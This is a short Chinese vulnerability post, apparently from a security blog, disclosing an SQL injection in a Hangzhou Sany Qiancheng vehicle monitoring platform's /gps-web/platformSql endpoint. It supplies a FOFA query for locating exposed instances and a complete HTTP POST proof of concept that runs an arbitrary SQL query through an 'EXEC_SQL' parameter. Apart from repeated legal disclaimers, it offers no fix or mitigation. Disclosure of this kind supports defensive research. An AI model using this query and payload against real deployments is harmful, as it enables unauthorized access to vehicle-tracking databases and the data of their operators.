#  杭州三一谦成科技车辆监控服务平台 platformSql SQL注入漏洞   
 HK安全小屋   2025-06-03 14:53  
  
## 免责声明  
  
       请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
  
  
漏洞描述：  
  
杭州三一谦成科技车辆监控服务平台接口 /gps-web/platformSql 存在SQL 注入漏洞。  
  
  
影响版本：  
  
杭州三一谦成科技车辆监控服务平台  
  
  
FOFA:  
```
body="gps-web" && title="欢迎光临"
```  
  
  
POC：  
```
POST /gps-web/platformSql HTTP/1.1
Host: 
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */* Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 74

action=EXEC_SQL&params=SELECT schema_name FROM information_schema.schemata
```  
  
成功进行数据查询  
  
![](https://mmbiz.qpic.cn/mmbiz_png/A8qcyicQXeI2iaVBwHw3CnvVxxO5mibwbfk0KvABxoecHTYjTySBibRMVTDgvN1k0CM9ibMDcfBOBpMTUYwWkGZlBPQ/640?wx_fmt=png&from=appmsg "")  
  
  
  
  
--------  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
  
  
  
  
  
